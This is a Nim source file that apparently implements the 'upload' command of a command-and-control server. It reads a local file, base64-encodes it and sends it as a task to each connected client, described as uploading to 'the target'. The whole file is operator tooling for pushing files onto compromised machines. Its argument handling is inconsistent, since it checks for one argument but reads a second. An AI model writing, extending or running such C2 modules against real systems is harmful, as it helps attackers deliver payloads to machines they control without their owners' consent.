import asyncdispatch, tables, os, base64

import ../../types, ../../communication, ../../logging

import ../../../clientTasks/upload

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  if len(args) < 1:
    errorLog "you must specify a local path to a file to upload, see 'help upload'"
    return
  
  if not fileExists(args[0]):
    errorLog "file " & args[0] & " does not exist"
    return
  
  for client in server.cli.handlingClient:
    let fileContents = readFile(args[0])
    let task = await upload.sendTask(client, args[1], encode(fileContents))
    
    if not task.isNil(): await task.awaitResponse()

let cmd*: Command = Command(
  execProc: execProc,
  name: "upload",
  argsLength: 1,
  usage: @["upload \"[local path]\" \"[remote path]\""],
  cliMode: @[ClientInteractMode],
  description: "Upload a file to the target",
  category: CCClientInteraction,
  requiresConnectedClient: true
)